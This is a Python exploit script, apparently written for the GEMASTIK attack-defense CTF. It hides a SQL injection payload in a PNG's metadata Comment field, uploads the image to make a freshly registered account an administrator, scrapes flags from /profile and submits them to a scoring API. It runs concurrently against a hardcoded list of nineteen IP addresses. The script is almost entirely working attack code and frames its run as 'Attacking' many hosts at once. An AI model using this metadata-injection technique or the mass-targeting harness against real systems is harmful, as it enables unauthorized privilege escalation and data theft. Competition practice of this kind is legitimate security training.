#!/usr/bin/env python3
# Automates SQLi via EXIF Comment -> admin role -> /profile flag read
# WARNING: Only use on authorized CTF targets.

import io
import re
import sys
import time
import uuid
import json
import random
import argparse
from typing import List, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from PIL import Image, PngImagePlugin

# -------------------------
# Defaults (override via CLI)
# -------------------------

DEFAULT_TARGETS = [
    "47.128.189.162:10000",
    "47.130.186.160:10000",
    "47.129.232.208:10000",
    "18.136.104.104:10000",
    "3.0.59.42:10000",
    "13.213.66.91:10000",
    "13.215.174.231:10000",
    "13.213.9.98:10000",
    "13.250.110.172:10000",
    "52.77.254.10:10000",
    "18.136.203.203:10000",
    "18.142.47.188:10000",
    "3.0.95.52:10000",
    "13.215.162.81:10000",
    "13.229.104.126:10000",
    "13.229.240.234:10000",
    "13.229.67.66:10000",
    "54.169.34.94:10000",
    "47.129.211.16:10000",
]

HTTP_TIMEOUT = 12
MAX_WORKERS = 12
SCHEME = "http"

# Flag regex (override via --flag-re)
FLAG_RE = re.compile(r"GEMASTIK\{[^\}\r\n]{1,200}\}")

# Optional submit API
SUBMIT_URL = "https://gemastik-api.siberlab.id/api/flag"

# -------------------------
# Helpers
# -------------------------


def base_url(host_port: str) -> str:
    if ":" not in host_port:
        host_port += ":8000"
    return f"{SCHEME}://{host_port}"


def rands(n=10) -> str:
    s = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(random.choice(s) for _ in range(n))


def make_png_with_comment(comment_text: str) -> bytes:
    """
    Create a tiny PNG with tEXt 'Comment' = comment_text.
    exiftool will print a line like:
      Comment                         : <comment_text>
    """
    img = Image.new("RGB", (1, 1), (255, 255, 255))
    pi = PngImagePlugin.PngInfo()
    pi.add_text("Comment", comment_text)
    buf = io.BytesIO()
    img.save(buf, "PNG", pnginfo=pi)
    return buf.getvalue()


def register(sess: requests.Session, base: str, username: str, password: str) -> bool:
    try:
        r = sess.post(
            f"{base}/register",
            data={"username": username, "password": password},
            timeout=HTTP_TIMEOUT,
            allow_redirects=True,
        )
        return r.status_code in (200, 302)
    except Exception:
        return False


def login(sess: requests.Session, base: str, username: str, password: str) -> bool:
    try:
        r = sess.post(
            f"{base}/login",
            data={"username": username, "password": password},
            timeout=HTTP_TIMEOUT,
            allow_redirects=True,
        )
        return r.status_code in (200, 302)
    except Exception:
        return False


def upload_exif_sqli(sess: requests.Session, base: str, png_bytes: bytes) -> bool:
    """
    POST /create with our PNG. Field names follow the app: title/content/image.
    """
    try:
        files = {"image": ("poc.png", png_bytes, "image/png")}
        r = sess.post(
            f"{base}/create",
            data={"title": "auto", "content": "auto"},
            files=files,
            timeout=HTTP_TIMEOUT,
            allow_redirects=True,
        )
        return r.status_code in (200, 302)
    except Exception:
        return False


def get_profile(sess: requests.Session, base: str) -> str:
    try:
        r = sess.get(f"{base}/profile", timeout=HTTP_TIMEOUT, allow_redirects=True)
        return r.text if r.status_code == 200 else ""
    except Exception:
        return ""


def extract_flags(text: str, flag_re: re.Pattern) -> List[str]:
    return list(dict.fromkeys(flag_re.findall(text or "")))


def submit_flag(flag_inner: str, token: str) -> Tuple[bool, str]:
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    data = {"flag": flag_inner}
    try:
        r = requests.post(SUBMIT_URL, headers=headers, json=data, timeout=15)
        try:
            resp = r.json()
        except Exception:
            resp = {"message": r.text.strip()[:200]}
        if r.status_code == 200:
            return True, resp.get("message", "OK")
        return False, resp.get("message", f"HTTP {r.status_code}")
    except Exception as e:
        return False, f"network error: {e}"


def run_once(
    host_port: str, flag_re: re.Pattern, dry_run: bool = False
) -> Tuple[str, List[str]]:
    base = base_url(host_port)
    sess = requests.Session()
    sess.headers.update({"User-Agent": "exif-sqli/1.0"})

    username = f"user_{rands(8)}"
    password = f"P@ss_{rands(12)}"

    ok = register(sess, base, username, password)
    if not ok:
        print(f"[!] {base} register failed", file=sys.stderr)
        return host_port, []

    ok = login(sess, base, username, password)
    if not ok:
        print(f"[!] {base} login failed", file=sys.stderr)
        return host_port, []

    # SQLi payload — closes the UPDATE string, runs our UPDATE, comments the rest
    # metadata_insert is: UPDATE posts SET metadata = '<metadata_text>' WHERE id = X;
    # We inject a leading single-quote in the Comment value to break out.
    payload = f"'; UPDATE users SET role='admin' WHERE username='{username}'; --"
    png = make_png_with_comment(payload)

    ok = upload_exif_sqli(sess, base, png)
    if not ok:
        print(f"[!] {base} upload failed", file=sys.stderr)
        return host_port, []

    # Give the backend a moment to run exiftool and DB.executescript
    time.sleep(0.3)

    # Now visit profile; admin should see the flag
    html = get_profile(sess, base)
    if not html:
        print(f"[!] {base} /profile empty", file=sys.stderr)
        return host_port, []

    flags = extract_flags(html, flag_re)
    if flags:
        print(f"[+] {host_port}: {len(flags)} flag(s) found")
    else:
        # Optional: print tiny snippet for debugging
        snippet = re.sub(r"\s+", " ", html)[:200]
        print(f"[-] {host_port}: no flag, profile snippet: {snippet}", file=sys.stderr)
    return host_port, flags


# -------------------------
# Main
# -------------------------


def main():
    ap = argparse.ArgumentParser(
        description="GEMASTIK EXIF-SQLi flag harvester + submitter"
    )
    ap.add_argument(
        "--targets", nargs="*", default=DEFAULT_TARGETS, help="list of host[:port]"
    )
    ap.add_argument("--workers", type=int, default=MAX_WORKERS)
    ap.add_argument(
        "--flag-re", default=r"GEMASTIK18\{[^\}\r\n]{1,200}\}", help="flag regex"
    )
    ap.add_argument(
        "--token", default="", help="Bearer token for submission (optional)"
    )
    ap.add_argument(
        "--no-submit", action="store_true", help="only print flags, do not submit"
    )
    args = ap.parse_args()

    flag_re = re.compile(args.flag_re)

    if not args.targets:
        print("[!] No targets", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Attacking {len(args.targets)} targets with {args.workers} workers")

    all_flags: List[str] = []
    seen: Set[str] = set()

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = [ex.submit(run_once, t, flag_re) for t in args.targets]
        for fut in as_completed(futs):
            target, flags = fut.result()
            for f in flags:
                if f not in seen:
                    seen.add(f)
                    all_flags.append(f)

    if not all_flags:
        print("[*] No flags found")
        return

    print(f"[*] Total unique flags: {len(all_flags)}")
    for f in all_flags:
        print(f)

    if args.no_submit or not args.token:
        return

    print("[*] Submitting flags one-by-one...")
    for f in all_flags:
        # submit inner content if your API expects it without the wrapper
        inner = f.split("GEMASTIK18{")[-1].split("}")[0]
        ok, msg = submit_flag(inner, args.token)
        status = "OK" if ok else "ERR"
        print(f"{status} submit {inner} -> {msg}")
        time.sleep(0.2)


if __name__ == "__main__":
    main()
